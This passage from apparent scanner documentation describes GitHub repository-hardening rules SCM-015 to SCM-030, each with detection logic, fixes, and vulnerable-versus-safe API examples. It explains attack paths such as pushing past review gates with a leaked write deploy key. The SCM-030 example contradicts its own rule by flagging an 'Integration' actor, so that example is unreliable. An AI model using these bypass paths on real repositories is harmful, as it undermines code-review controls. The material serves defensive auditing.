**Recommendation.** Enable secret scanning push protection under the repository's Settings -> Code security -> Push protection. Pushes containing matched credential patterns are refused by GitHub before the commit is accepted, so the credential never enters git history. Authors get an immediate remediation prompt; the bypass-with-justification flow preserves the audit trail when a legitimate test-case credential needs to land.

**Known false positives.**

- When the scanning token lacks ``admin`` scope on the repo, the ``security_and_analysis`` block is omitted from the API response and this rule cannot tell ``disabled`` from ``unknown``. Re-run with admin scope to confirm.
- Push protection covers the GitHub-managed pattern set (~200 token patterns from major providers). Custom-pattern support requires GitHub Advanced Security on private repos; public repos get the GitHub-managed set free.

**Proof of exploit.**

```
# Vulnerable: secret scanning is enabled but push
# protection is off. Secrets are surfaced AFTER they hit
# the remote — the credential is already in history,
# already mirrored to backups, already visible to anyone
# who fetched between push and rotation. Rotation is the
# only fix.
# GET /repos/myorg/myrepo (vulnerable response):
{
  "security_and_analysis": {
    "secret_scanning": {"status": "enabled"},
    "secret_scanning_push_protection": {"status": "disabled"}
  }
}

# Safe: both on. Push protection refuses pushes that
# carry a recognized credential pattern; the developer
# sees the rejection at ``git push`` time and rotates
# BEFORE the secret enters history.
# PATCH /repos/myorg/myrepo:
{
  "security_and_analysis": {
    "secret_scanning": {"status": "enabled"},
    "secret_scanning_push_protection": {"status": "enabled"}
  }
}
```

**Source:** [`SCM-015`](../providers/scm.md#scm-015) in the [SCM provider](../providers/scm.md).

### `SCM-016`: Private vulnerability reporting is not enabled <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-016 }

**Evidences:** [`1.2.6`](#ctrl-1-2-6) Ensure all code projects are tracked for changes in dependents/dependencies, [`1.5.1`](#ctrl-1-5-1) Ensure scanners are in place to identify and prevent sensitive data in code.

**How this is detected.** Reads ``security_and_analysis.private_vulnerability_reporting.status`` from the repo metadata payload. Fires when the value is anything other than ``enabled``. Severity is LOW because the rule documents process readiness rather than a structural vulnerability — but having no private reporting channel means the next external researcher's report is either a public issue or nothing.

**Recommendation.** Enable private vulnerability reporting under the repository's Settings -> Code security -> Private vulnerability reporting. Researchers get a private ``Security`` tab where they can submit details directly to maintainers; the maintainers can then triage, request a CVE, coordinate disclosure timing, and merge a fix without exposing the bug publicly until ready.

**Known false positives.**

- When the scanning token lacks ``admin`` scope on the repo, the ``security_and_analysis`` block is omitted from the API response and this rule cannot tell ``disabled`` from ``unknown``. Re-run with admin scope to confirm.
- Repos that publish a SECURITY.md with an alternative out-of-band reporting channel (security@ mailbox, HackerOne / Bugcrowd program) cover the same control via a different mechanism. Suppress via ignore-file when the alternative is in place and documented.

**Source:** [`SCM-016`](../providers/scm.md#scm-016) in the [SCM provider](../providers/scm.md).

### `SCM-017`: Repository has no CODEOWNERS file <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-017 }

**Evidences:** [`1.1.6`](#ctrl-1-1-6) Ensure code owners are set for extra sensitive code or configuration, [`1.1.7`](#ctrl-1-1-7) Ensure code owner's review is required when a change affects owned code.

**How this is detected.** Probes the three canonical CODEOWNERS locations via ``GET /repos/{owner}/{repo}/contents/<path>``. Fires when none of the three returns a file response. Pairs with SCM-011 (the protection-rule toggle): SCM-011 covers intent, SCM-017 covers reality. A repo with both set is auditing the path-scoped review actually happens.

**Recommendation.** Add a ``CODEOWNERS`` file at ``.github/CODEOWNERS`` (the GitHub-recommended location), ``CODEOWNERS`` at the repo root, or ``docs/CODEOWNERS``. Map directories to the team or individual responsible for them. With SCM-011's ``require_code_owner_reviews`` knob enabled, GitHub auto-requests review from the matched owners on every PR; without the file, the toggle is meaningless and any reviewer can approve any change.

**Known false positives.**

- Single-team repos where every contributor is a code owner of every path may legitimately skip CODEOWNERS — the file adds no routing in that case. Suppress via ignore-file when the team intentionally stays flat. The same suppression applies to SCM-011.

**Source:** [`SCM-017`](../providers/scm.md#scm-017) in the [SCM provider](../providers/scm.md).

### `SCM-018`: Required PR reviews can be bypassed by named identities <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-018 }

**Evidences:** [`1.1.5`](#ctrl-1-1-5) Ensure there are restrictions on who can dismiss code change reviews.

**How this is detected.** Reads ``required_pull_request_reviews.bypass_pull_request_allowances`` from the branch protection payload. Fires when any of ``users`` / ``teams`` / ``apps`` is non-empty. Surfaces the counts so the operator can locate the bypass entries in the GitHub UI without re-running the audit manually.

**Recommendation.** In the default-branch protection rule, clear ``Allow specified actors to bypass required pull requests`` (``required_pull_request_reviews.bypass_pull_request_allowances`` in the API). Required reviews are only as strong as the bypass list. If a release-bot account needs to merge automated PRs, prefer a separate protection rule for the bot's branch namespace rather than a bypass entry on the default branch.

**Seen in the wild.**

- Multiple GitHub Security Lab writeups attribute post-incident review-control gaps to legacy bypass entries: a contractor onboarded years earlier is listed in the allowance, a compromise of that contractor account merges tampered code despite the team having added required reviews on the default branch.

**Source:** [`SCM-018`](../providers/scm.md#scm-018) in the [SCM provider](../providers/scm.md).

### `SCM-019`: Push restrictions allowlist names individual users <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-019 }

**Evidences:** [`1.1.15`](#ctrl-1-1-15) Ensure pushing/merging on default branches is restricted.

**How this is detected.** Reads ``restrictions.users`` from the branch protection payload. Fires when the list is non-empty. ``restrictions`` itself being absent is the default GitHub posture (no push allowlist; review gates govern access) and passes this rule. Teams and apps in ``restrictions`` are not flagged — the rule audits the personal-account subset specifically.

**Recommendation.** In the default-branch protection rule, audit the ``Restrict who can push to matching branches`` allowlist (``restrictions`` in the API). Move each individual user into a GitHub team and add the team instead, or replace with a GitHub App / bot service account when the entry is an automation. Named user entries are personal-compromise vectors that bypass every PR-review gate on the branch.

**Known false positives.**

- A break-glass admin account intentionally listed for incident response is a legitimate use case. Suppress via ignore-file once the account's access has been reviewed (MFA, hardware token, audit-logged use).

**Source:** [`SCM-019`](../providers/scm.md#scm-019) in the [SCM provider](../providers/scm.md).

### `SCM-020`: Default workflow GITHUB_TOKEN has write permission <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-020 }

**Evidences:** [`1.4.3`](#ctrl-1-4-3) Ensure the access granted to each installed application is limited, [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Reads ``default_workflow_permissions`` from ``GET /repos/{owner}/{repo}/actions/permissions/workflow``. Values are ``"read"`` (safe) or ``"write"`` (fail). Requires the token to have ``admin`` scope on the repo; without it GitHub returns 403 and the rule passes silently with an unavailability note. Complements GHA-048 / GHA-049 — those catch the *workflow* asking for write; SCM-020 catches the *org / repo* handing out write by default.

**Recommendation.** In repo Settings → Actions → General → Workflow permissions, set the default to ``Read repository contents and packages permissions``. Workflows that genuinely need to push, comment on PRs, or modify issues opt in explicitly via the workflow-file ``permissions:`` block. The default ``write`` setting gives every workflow's ``GITHUB_TOKEN`` write access to every API surface the repo exposes (contents, issues, PRs, actions, packages, deployments), so a single compromised dependency in any job is one step away from the GHA-048 / GHA-049 worm-propagation primitives (workflow self-mutation, cross-repo push) the rule pack catches at the workflow-YAML layer. Setting the default to ``read`` is the org-side complement: even if a workflow forgets to declare ``permissions:`` and the compromised dep tries to push, GitHub refuses the operation.

**Known false positives.**

- Repos where every workflow legitimately needs write access (release-publishing automation, mirror-sync jobs) may set the default to ``write`` deliberately. The right pattern is still to keep the default at ``read`` and grant write at the workflow level — that way a new workflow (added by a future contributor) starts safe. Suppress only when every workflow in the repo carries an explicit ``permissions:`` block.

**Seen in the wild.**

- Shai-Hulud npm worm (2026): the worm's propagation primitive was a stolen ``GITHUB_TOKEN`` with ``contents: write`` and ``workflows: write``. Repos whose default workflow permissions were ``read`` were unaffected even when their workflows ran a compromised npm dep; ``write``-default repos handed the worm the keys.

**Proof of exploit.**

```
# Vulnerable: ``default_workflow_permissions: write``
# means every workflow's ``GITHUB_TOKEN`` starts with
# repo-write authority. A typo'd ``run:`` (or an
# injection per GHA-003) can ``git push`` to any branch,
# open issues, comment on PRs, write packages — the
# attack surface of every action expands by default.
# GET /repos/myorg/myrepo/actions/permissions/workflow:
{
  "default_workflow_permissions": "write",
  "can_approve_pull_request_reviews": false
}

# Safe: ``read`` default. Workflows that genuinely need
# elevated rights declare per-job ``permissions:`` blocks
# that scope the token to the specific verbs they need
# (``contents: write`` for a release publisher,
# ``packages: write`` for a registry push, etc.).
# PUT /repos/myorg/myrepo/actions/permissions/workflow:
{
  "default_workflow_permissions": "read",
  "can_approve_pull_request_reviews": false
}
```

**Source:** [`SCM-020`](../providers/scm.md#scm-020) in the [SCM provider](../providers/scm.md).

### `SCM-021`: Actions can approve pull requests (self-approval bypass) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-021 }

**Evidences:** [`1.1.5`](#ctrl-1-1-5) Ensure there are restrictions on who can dismiss code change reviews, [`1.4.1`](#ctrl-1-4-1) Ensure administrator approval is required for every installed application.

**How this is detected.** Reads ``can_approve_pull_request_reviews`` from ``GET /repos/{owner}/{repo}/actions/permissions/workflow``. ``True`` is the fail signal; ``False`` (or absent) passes. Requires admin scope on the repo. Complements SCM-002 / SCM-011 / SCM-014 — without SCM-021, those rules document intent rather than enforcement, because Actions can fulfil the review requirement itself.

**Recommendation.** In repo Settings → Actions → General → Workflow permissions, uncheck ``Allow GitHub Actions to create and approve pull requests``. With it on, any workflow whose ``GITHUB_TOKEN`` includes ``pull-requests: write`` can submit an approving review on a PR — including its own. Required-review controls (SCM-002), CODEOWNERS reviews (SCM-011), and last-push approval (SCM-014) all become advisory once Actions can satisfy their own gate. A compromised dependency that opens a PR can immediately approve and merge it without any human in the loop.

**Known false positives.**

- Some orgs allow Actions self-approval as part of a tightly-scoped automation flow (e.g., a code-formatter bot that opens-and-merges its own PRs). The safer pattern is to grant the bot a dedicated PAT scoped to PR-create-and-approve, not the repo-wide GITHUB_TOKEN. Suppress only when the trade-off has been documented.

**Proof of exploit.**

```
# Vulnerable: ``can_approve_pull_request_reviews: true``
# means a workflow's ``GITHUB_TOKEN`` (or an installation
# token) can approve a pull request. Combined with the
# required-reviews protection, a malicious workflow self-
# approves its own PR and lands code into ``main`` without
# a human reviewer.
# GET /repos/myorg/myrepo/actions/permissions/workflow:
{
  "can_approve_pull_request_reviews": true
}

# Safe: actions cannot approve PRs. Human approval is
# the gating signal; automation can comment / label /
# trigger checks but cannot satisfy the review
# requirement.
# PUT /repos/myorg/myrepo/actions/permissions/workflow:
{
  "can_approve_pull_request_reviews": false
}
```

**Source:** [`SCM-021`](../providers/scm.md#scm-021) in the [SCM provider](../providers/scm.md).

### `SCM-022`: Repo Actions permissions allow any source (no allow-list) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-022 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure administrator approval is required for every installed application, [`1.4.3`](#ctrl-1-4-3) Ensure the access granted to each installed application is limited.

**How this is detected.** Reads ``allowed_actions`` from ``GET /repos/{owner}/{repo}/actions/permissions``. Values: ``"selected"`` (allow-listed) and ``"local_only"`` (org-internal only) pass; ``"all"`` (no restriction) fails. Requires admin scope. The rule passes silently when Actions is disabled at the repo level (``enabled: false``) — nothing runs, so the source restriction is moot.

**Recommendation.** In repo Settings → Actions → General → Actions permissions, set the allow-list mode to ``Allow <owner>, and select non-<owner>, actions and reusable workflows`` (``selected``) and curate a list of trusted publishers. Each new third-party action becomes an explicit decision rather than the result of a workflow writer adding ``uses: random/unknown@v1`` and CI silently executing it. The shipped pack of GHA-040 (compromised-action registry) plus GHA-041..047 (action reputation checks) provides the workflow-time signal; SCM-022 is the org-policy gate that says ``don't even let an untrusted action onto the runner.``

**Known false positives.**

- Repos that legitimately consume a wide variety of third-party actions (open-source CI examples, marketplace-aggregator demos) may accept the ``all`` mode as a trade-off. The right defense in that case is rigorous SHA-pinning (GHA-001) plus the GHA-040..047 reputation pack; SCM-022 is the org-level allow-list that becomes redundant when every workflow already pins to a vetted commit.

**Source:** [`SCM-022`](../providers/scm.md#scm-022) in the [SCM provider](../providers/scm.md).

### `SCM-023`: Deployment environment lacks required-reviewer protection <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-023 }

**Evidences:** [`1.1.3`](#ctrl-1-1-3) Ensure any change to code is approved by two strongly authenticated users.

**How this is detected.** Walks ``GET /repos/{owner}/{repo}/environments`` and flags every environment whose ``protection_rules`` list doesn't include a rule with ``type == "required_reviewers"``. Passes silently when no environments are configured (``total_count: 0``) — there's nothing to evaluate. Pairs with GHA-050 (the workflow-layer rule that checks ``jobs.<id>.environment:`` is declared) and SCM-024 (deployment-branch-policy on the same environments).

**Recommendation.** Configure required reviewers on every deployment environment (Settings → Environments → <name> → ``Required reviewers``). Pick a team or set of users who must approve each deployment job that targets the environment. Without a required-reviewer protection rule, any workflow run with the right environment name in its ``jobs.<id>.environment:`` block can deploy without human gate — the exact primitive GHA-050 (publish without OIDC + environment) catches at the workflow layer. SCM-023 is the org-level complement: a workflow that *declares* an environment still needs the environment itself to enforce the gate.

**Known false positives.**

- Non-production environments (``preview``, ``staging-ephemeral``) that legitimately auto-deploy without human gate are flagged by this rule, since GitHub doesn't distinguish environment severity. Suppress on those specific environment names with a rationale rather than disabling the rule for the whole repo.

**Proof of exploit.**

```
# Vulnerable: the ``production`` environment has no
# required reviewers configured. Any workflow that
# references ``environment: production`` runs without
# human approval, even when the trigger is a fork PR
# (with the protections workflow_run is supposed to add).
# Deploy keys / production secrets bound to the env are
# accessible to the workflow without a gating human.
# GET /repos/myorg/myrepo/environments/production:
{
  "name": "production",
  "protection_rules": []
}

# Safe: required reviewers + a wait timer. The deploy
# workflow pauses for human approval before the
# production secrets become resolvable.
# PUT /repos/myorg/myrepo/environments/production:
{
  "name": "production",
  "reviewers": [
    {"type": "Team", "id": 1234567}
  ],
  "wait_timer": 5
}
```

**Source:** [`SCM-023`](../providers/scm.md#scm-023) in the [SCM provider](../providers/scm.md).

### `SCM-024`: Deployment environment can deploy from any branch <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-024 }

**Evidences:** [`1.1.15`](#ctrl-1-1-15) Ensure pushing/merging on default branches is restricted.

**How this is detected.** Reads each environment's ``deployment_branch_policy`` field. ``null`` means any branch can deploy and fails; ``{"protected_branches": true}`` or ``{"custom_branch_policies": true}`` (with at least one configured policy) passes. Passes silently when no environments are configured. Pairs with SCM-023 (required reviewers on the same environments); both knobs together close the deploy-gate loop.

**Recommendation.** Configure a deployment-branch policy on every environment (Settings → Environments → <name> → ``Deployment branches and tags``). Pick ``Protected branches only`` for production-like environments so a workflow run on a feature branch cannot push to production. The combination ``required reviewers`` (SCM-023) + ``deployment branch policy`` (SCM-024) is the deploy-gate the rest of the rule pack (GHA-050 publish-without-OIDC, SCM-001 branch protection) assumes is in place; without SCM-024, a workflow on any branch can target the production environment and reviewers approve a stale or wrong-branch deployment without realizing.

**Known false positives.**

- Test / preview environments often accept any branch by design (the whole point is to validate feature branches before merging). Suppress on those specific environment names; treat the rule as production-scoped.

**Source:** [`SCM-024`](../providers/scm.md#scm-024) in the [SCM provider](../providers/scm.md).

### `SCM-025`: Repo has write-enabled deploy keys (push backdoor) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-025 }

**Evidences:** [`1.3.10`](#ctrl-1-3-10) Ensure SCM administrators control contribution access (deploy keys, write).

**How this is detected.** Reads ``GET /repos/{owner}/{repo}/keys`` and flags every deploy key whose ``read_only`` field is false. Requires ``admin`` scope on the repo; without it GitHub returns 403 / 404 and the rule passes silently with an unavailability note. Deploy keys come in two shapes: read-only (clone access only, safe equivalent of a public-fork checkout) and write-enabled (push access, the failure case this rule catches). The endpoint returns the SSH public key plus metadata, never the private half — the scan can't recover the credential, only enumerate which keys exist and what scope each carries.

Complements every branch-protection rule in the pack: without SCM-025, an unaudited write deploy key bypasses the entire control set the other rules document. Also pairs with SCM-018 (PR-review bypass allowance) and SCM-019 (push-restriction allowlist), which catch the same risk shape on the user / team side.

**Recommendation.** Convert every deploy key to read-only (Settings → Deploy keys → uncheck ``Allow write access``), then rotate the underlying SSH key pair if the previous holder no longer needs write access. Deploy keys are repo-scoped SSH credentials that bypass GitHub's normal RBAC — anyone with the private half can push directly, side-stepping branch protection (SCM-001), required reviews (SCM-002), CODEOWNERS (SCM-011), and the user-account audit trail. If the use case genuinely needs push (a CI runner that tags releases, a release-bot account), prefer a fine-grained PAT or a GitHub App with constrained scope, both of which carry user-visible audit-log entries that deploy keys do not.

**Known false positives.**

- Some CI flows legitimately use a write deploy key for release tagging or auto-generated docs commits. The right pattern is a GitHub App or a fine-grained PAT with an audit trail; deploy keys persist indefinitely and leave no record of who used them. Suppress with a one-line rationale that names the specific key title.

**Seen in the wild.**

- Long-running pattern of forgotten deploy keys retaining write access years after the original owner left an org. Public catalogs of leaked SSH private keys on paste sites and GitHub itself routinely hit configured deploy keys; the corresponding repo is push-compromised until the operator revokes the key.

**Proof of exploit.**

```
# Vulnerable: a write-enabled deploy key sits on the repo
# for years. The private half lived on a contractor's
# laptop and was checked into a public gist during a
# transient debug session.
GET /repos/acme/payments-api/keys
[
  {
    "id": 42,
    "title": "ci-runner-prod (added 2021-03)",
    "key": "ssh-ed25519 AAAA... ci-runner",
    "read_only": false,
    "created_at": "2021-03-04T10:00:00Z"
  }
]

# Attack: ``git push git@github.com:acme/payments-api.git``
# using the leaked private key writes directly to master,
# bypassing every required-review / CODEOWNERS / status-
# check gate the other SCM rules document. The push shows
# up in the audit log as ``key:42`` rather than a user
# account, so detection requires correlation across
# audit-log events most operators never review.

# Safe: revoke the deploy key. If write access is
# genuinely required for CI tagging, switch to a GitHub
# App with constrained scope plus a one-line audit-log
# entry per push.
```

**Source:** [`SCM-025`](../providers/scm.md#scm-025) in the [SCM provider](../providers/scm.md).

### `SCM-026`: Webhook ships events insecurely (HTTP / no-TLS / no-secret) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-026 }

**Evidences:** [`1.4.4`](#ctrl-1-4-4) Ensure only secured webhooks are used.

**How this is detected.** Reads ``GET /repos/{owner}/{repo}/hooks`` and flags any active webhook with one or more failure modes:

* ``config.url`` starts with ``http://`` — push payloads   including code diffs leak over plain HTTP
* ``config.insecure_ssl == "1"`` — TLS certificate   verification disabled, MITM possible on the HTTPS   endpoint
* ``config.secret`` is null / missing — no HMAC   signature, so anyone who learns the URL can forge   events into the receiver

Inactive webhooks (``active: false``) are skipped — they don't fire. Each finding's description lists every failure mode hit so the operator sees the full fix scope per webhook. Requires admin scope; without it the endpoint returns 403 / 404 and the rule passes silently. GitHub never returns the actual secret value via the API; the slot reports either ``"********"`` (configured) or ``null`` (missing), so this rule detects the absence without ever handling the credential itself.

**Recommendation.** For each flagged webhook, fix all three knobs at once (Settings → Webhooks → <hook> → Edit):

* Switch the Payload URL to ``https://`` and enable ``Verify SSL`` (the field is labeled ``SSL verification`` on the form; setting it to ``Enable SSL verification`` is the safe value).
* Set the ``Secret`` field to a long random value and validate the incoming ``X-Hub-Signature-256`` header on the receiving end. Without the secret + verification, an attacker who learns the URL (URLs are not secrets; they appear in receiving-system logs, in CI screenshots, in support tickets) can forge events.

If the receiving service genuinely cannot handle HTTPS or shared secrets, terminate TLS at a reverse proxy in front of the receiver and keep the public-facing URL ``https://`` with a real cert. The webhook content carries the full event payload — pull requests with diff content, push events with the commits, secret scanning alerts — which is exactly what an unauthenticated MITM is looking for.

**Known false positives.**

- Long-running internal-only webhooks pointing at a hostname only resolvable inside a private network (``http://internal.svc/hook``) often skip TLS by convention. The right fix is still to terminate TLS at an ingress and use a non-empty secret; the rule does not have visibility into network topology and cannot distinguish 'public HTTP' from 'private-network HTTP', so it errs toward flagging. Suppress per webhook id with a rationale that names the receiving service.

**Seen in the wild.**

- Long-running pattern of webhook payloads leaking via plain-HTTP receivers (Zapier, IFTTT, custom legacy endpoints) — the GitHub repo's commit-diff content, pull-request body, and secret-scanning alert payloads all land on the wire unencrypted. Public catalogs of compromised internal webhooks document the receiver-side breach where the URL alone was enough to inject forged events when no shared secret was configured.

**Proof of exploit.**

```
# Vulnerable: the webhook ships events over plaintext
# HTTP and carries no shared secret. Any network attacker
# between GitHub and the receiver sniffs the event
# payload (PR titles, commit messages, sometimes file
# contents) and can also forge requests at the receiver
# since no HMAC validation is possible.
# GET /repos/myorg/myrepo/hooks/12345:
{
  "config": {
    "url": "http://webhook.example.com/gh",
    "content_type": "json",
    "insecure_ssl": "1",
    "secret": ""
  }
}

# Safe: HTTPS endpoint, TLS verification on, and a
# shared HMAC secret the receiver validates against
# the ``X-Hub-Signature-256`` header on every delivery.
# PATCH /repos/myorg/myrepo/hooks/12345:
{
  "config": {
    "url": "https://webhook.example.com/gh",
    "content_type": "json",
    "insecure_ssl": "0",
    "secret": "<32-byte-random>"
  }
}
```

**Source:** [`SCM-026`](../providers/scm.md#scm-026) in the [SCM provider](../providers/scm.md).

### `SCM-027`: Outside collaborator holds write / maintain / admin access <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-027 }

**Evidences:** [`1.3.8`](#ctrl-1-3-8) Ensure strict base permissions are set for repositories, [`1.3.10`](#ctrl-1-3-10) Ensure SCM administrators control contribution access (deploy keys, write).

**How this is detected.** Walks ``GET /repos/{owner}/{repo}/collaborators?affiliation=outside`` and flags every entry whose ``permissions`` block has any of ``admin: true``, ``maintain: true``, or ``push: true``. Read-only (``permissions.pull: true`` with no higher tier) and triage entries pass. Each finding's description names every elevated collaborator with the granular level so the operator can prioritize.

Requires admin scope on the repo to enumerate the outside-collaborator list; without it the endpoint returns 403 and the rule passes silently with an unavailability note. The hydrator fetches a single page (``per_page=100``); in the rare case of more than 100 outside collaborators on one repo, the description appends a truncation note and asks for a manual audit.

**Recommendation.** Audit Settings → Collaborators and teams → Outside collaborators. For each entry the rule flagged: either (a) downgrade the access to ``Read`` if the contributor only needs to clone / open PRs, or (b) move the account into the org as a member (so the org's centralized RBAC, SCIM, and access-review processes apply) before granting write access. Outside collaborators bypass the org's user-lifecycle controls: when the contractor's term ends, the entry stays until somebody manually removes it. A compromised outside-collab account with ``push`` access is the direct path to bypassing branch protection: that account can push code that SCM-021 (Actions self-approval) or SCM-018 (PR bypass allowance) clears through every required-review gate. Maintain / admin extends the blast radius to repo-config control.

**Known false positives.**

- Some flows legitimately grant write access to a vetted outside collaborator on a short-term basis (audit firm, incident responder, vendor escalation). The right compensating control is a calendar-bound suppression with the rationale and the expected revocation date; the rule itself should keep flagging the access so the revocation date is visible at every scan.

**Seen in the wild.**

- Long-running pattern across compromise postmortems: a former contributor's outside-collaborator entry retains ``push`` access years after the engagement ended. The account is then taken over (often by credential stuffing or a leaked PAT), and the attacker pushes a tampered commit that lands without review because the access level itself is the gate.

**Proof of exploit.**

```
# Vulnerable: an outside collaborator (a contractor, a
# departed employee whose access wasn't fully revoked,
# a security-researcher allowed in for a one-off audit)
# carries ``write`` / ``maintain`` / ``admin`` on the
# repo. The blast radius of their account compromise
# is the same as an internal maintainer's.
# GET /repos/myorg/myrepo/collaborators?affiliation=outside:
[
  {
    "login": "contractor-alice",
    "role_name": "write"
  }
]

# Safe: outside collaborators carry ``read`` or ``triage``
# only. If they need to land code, route through fork +
# PR + internal-reviewer approval. Re-run access reviews
# quarterly and revoke on engagement end.
# PUT /repos/myorg/myrepo/collaborators/contractor-alice:
{
  "permission": "read"
}
```

**Source:** [`SCM-027`](../providers/scm.md#scm-027) in the [SCM provider](../providers/scm.md).

### `SCM-028`: Private repo allows forking <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-028 }

**Evidences:** [`1.2.5`](#ctrl-1-2-5) Ensure all copies (forks) of code are tracked and accounted for.

**How this is detected.** Reads ``private`` and ``allow_forking`` from the repo metadata. Fires when both are ``true``. Public repos (``private: false``) pass — forking a public repo is expected. Repos that explicitly disable forking (``allow_forking: false``) pass regardless of visibility. The fork-vs-Actions-secret-leak interaction is the operational risk: a fork PR using ``pull_request_target`` runs with the *base* repo's secrets, so a fork carries both the code and a path to the secrets if the workflow surface is permissive. Pairs with GHA-027 (``pull_request_target`` on untrusted input) and GHA-046 (manual PR-head fetches on untrusted triggers) at the workflow layer; SCM-028 is the org-policy gate.

**Recommendation.** In repo Settings → General → Features, uncheck ``Allow forking``. The setting only opens the trapdoor if you actually use ``pull_request_target`` or trigger workflows on fork PRs, but every private-repo fork carries the code into the forker's personal namespace (which has its own visibility surface — public profile, weaker 2FA enforcement, separate token scope). Even without the Actions-secret leak surface, allowing forks of a private repo means a compromised user account that had access at any point can preserve a copy of the intellectual property indefinitely.

If forks are genuinely needed for the development workflow, enforce ``Allow forking`` at the org level and pair it with GHA-046 (block manual PR-head fetches on untrusted-trigger workflows) and GHA-027 (no ``pull_request_target`` on untrusted input) so the secret-leak surface stays closed at the workflow layer.

**Known false positives.**

- Org-wide development workflows that require contributors to fork-and-PR within the company (rather than push to branches in the original repo) legitimately rely on ``allow_forking: true`` for private repos. The right compensating control is the workflow-side hardening: GHA-027 / GHA-046 / SCM-021 (Actions self-approval off) together keep the secret-leak surface closed even when forks are allowed. Suppress with a rationale that names the contribution workflow.

**Source:** [`SCM-028`](../providers/scm.md#scm-028) in the [SCM provider](../providers/scm.md).

### `SCM-029`: Repository ruleset is in evaluate / disabled mode (not enforced) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-029 }

**Evidences:** [`1.1.15`](#ctrl-1-1-15) Ensure pushing/merging on default branches is restricted.

**How this is detected.** Walks ``GET /repos/{owner}/{repo}/rulesets`` and flags every entry whose ``enforcement`` is anything other than ``"active"``. Two failure shapes are typical:

* ``enforcement: "evaluate"`` — preview / dry-run mode;   the ruleset logic runs but doesn't block.
* ``enforcement: "disabled"`` — explicit off; rule   exists in the UI but takes no effect.

Passes silently when no rulesets are configured (``[]``); in that case the SCM-001..010 legacy branch-protection rules carry the governance load. Requires admin scope on the repo; without it the endpoint returns 403 / 404 and the rule passes silently with an unavailability note.

**Recommendation.** Flip every non-enforcing ruleset to ``enforcement: active`` (Settings → Rules → Rulesets → <name> → Enforcement status → Active). The ``evaluate`` mode is intentionally permissive: it runs the rule logic and surfaces what *would* have been blocked, but it never actually blocks the push, merge, or commit. ``disabled`` is the explicit off-switch. Both modes silently document intent without enforcing the policy — operators commonly create rulesets in ``evaluate`` to preview their effect and forget to flip them, leaving the repo with the audit appearance of governance and the behavior of none.

Note: the legacy-branch-protection rules in this pack (SCM-001..010) do NOT see rulesets. An org that has fully migrated to rulesets can pass the entire SCM-NNN legacy pack while every actual governance signal is in evaluate mode.

**Known false positives.**

- A freshly-authored ruleset legitimately sits in ``evaluate`` mode for a short audit window before promotion to ``active``. Suppress for that specific ruleset id with a calendar-bound rationale; the rule should keep flagging until the promotion lands so the transition window doesn't quietly become permanent.

**Source:** [`SCM-029`](../providers/scm.md#scm-029) in the [SCM provider](../providers/scm.md).

### `SCM-030`: Repository ruleset has bypass actor with bypass_mode: always <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-030 }

**Evidences:** [`1.1.12`](#ctrl-1-1-12) Ensure verification of signed commits for new changes, [`1.1.13`](#ctrl-1-1-13) Ensure linear history is required, [`1.1.14`](#ctrl-1-1-14) Ensure branch protection rules are enforced for administrators, [`1.1.16`](#ctrl-1-1-16) Ensure force push is denied, [`1.1.17`](#ctrl-1-1-17) Ensure branch deletion is denied.

**How this is detected.** For each ``active`` ruleset, walks ``bypass_actors`` (populated by the per-ruleset detail fetch) and flags every entry with ``bypass_mode: "always"`` whose ``actor_type`` is not ``"Integration"`` (GitHub Apps). Non-app actors are listed by ``actor_type`` + ``actor_id``; the rule does not resolve those IDs to human-readable names (that would require another API round-trip per actor; the operator already sees the names in the UI when they go to fix it).

Rulesets in non-active enforcement modes are skipped — SCM-029 owns the not-enforced-at-all case and a non-active ruleset's bypass list is moot since the rules don't run anyway. Integration bypasses pass: a scoped GitHub App is a typical legitimate emergency-fix channel and shipping the bypass through the App's audit flow is the documented pattern. Requires admin scope; without it the ruleset-detail endpoint returns 403 / 404 and the rule passes silently.

**Recommendation.** For every bypass actor flagged, switch ``bypass_mode`` from ``always`` to ``pull_request`` in the ruleset configuration (Settings → Rules → <ruleset> → Bypass list → <actor> → Bypass mode). The ``pull_request`` mode requires the bypass to be requested via a PR review thread, which leaves an audit trail and gives reviewers a chance to push back. ``always`` mode is an unaudited override: the actor pushes / merges as if the ruleset weren't there, and no record names who or why. If the bypass is genuinely needed for emergency response, scope it to a specific GitHub App (the rule does not flag ``Integration`` bypasses by default) rather than a human role; an App is callable through your existing ticketing / approval flow.

**Known false positives.**

- Some orgs grant ``always`` bypass to a tightly-scoped automation team for after-hours emergency response. The right pattern is a GitHub App with auditable triggering (PagerDuty, Slack); ``always`` bypass for a human team leaves no record of the override. Suppress on the specific ruleset id with a calendar-bound rationale that names the audit channel and the next promotion review.

**Proof of exploit.**

```
# Vulnerable: the repo ruleset names a bypass actor with
# ``bypass_mode: always``. That actor (typically the
# ``github-actions[bot]`` or an internal automation
# account) skips every rule the ruleset enforces, on
# every push, without any audit signal. A compromised
# bot identity lands any change into ``main``.
# GET /repos/myorg/myrepo/rulesets/123:
{
  "name": "main-protection",
  "bypass_actors": [
    {"actor_id": 5, "actor_type": "Integration",
     "bypass_mode": "always"}
  ]
}

# Safe: ``bypass_mode: pull_request`` (the bot can open
# its own bypass-eligible PR but must still pass review)
# or remove the bypass actor entirely.
# PUT /repos/myorg/myrepo/rulesets/123:
{
  "name": "main-protection",
  "bypass_actors": [
    {"actor_id": 5, "actor_type": "Integration",
     "bypass_mode": "pull_request"}
  ]
}
```

**Source:** [`SCM-030`](../providers/scm.md#scm-030) in the [SCM provider](../providers/scm.md).

### `SCM-031`: Repo allows auto-merge (no human-timing gate) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-031 }

